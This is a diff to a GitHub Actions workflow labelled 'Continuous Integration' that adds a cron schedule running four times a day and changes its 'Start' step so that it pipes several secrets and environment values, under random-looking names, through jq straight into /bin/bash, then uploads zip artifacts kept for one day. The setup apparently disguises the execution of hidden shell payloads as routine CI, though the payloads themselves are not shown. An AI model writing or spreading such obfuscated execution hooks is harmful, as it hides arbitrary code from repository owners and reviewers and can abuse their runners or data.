@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '44 0,6,12,18 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,15 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          qx98: ${{ secrets.qx98 }}
+          sb653: ${{ secrets.sb653 }}
         run: |
-          printf '%s' "$qx98" | jq -r .vfgb55 | /bin/bash
-          echo $zhipe045 | jq -r .zzww482 | /bin/bash
-          printf '%s' "$iutph69" | jq -r .wejz13 | /bin/bash
+          printf '%s' "$sb653" | jq -r .yot361 | /bin/bash
+          echo $jrmej5 | jq -r .h55 | /bin/bash
+          printf '%s' "$dqxgw3" | jq -r .il688 | /bin/bash
+          printf '%s' "$k622" | jq -r .a48 | /bin/bash
+          printf '%s' "$n48" | jq -r .o2735 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: zQTQ6ZD5
+          name: HtxbqpZJ
           path: "*.zip"
           retention-days: 1
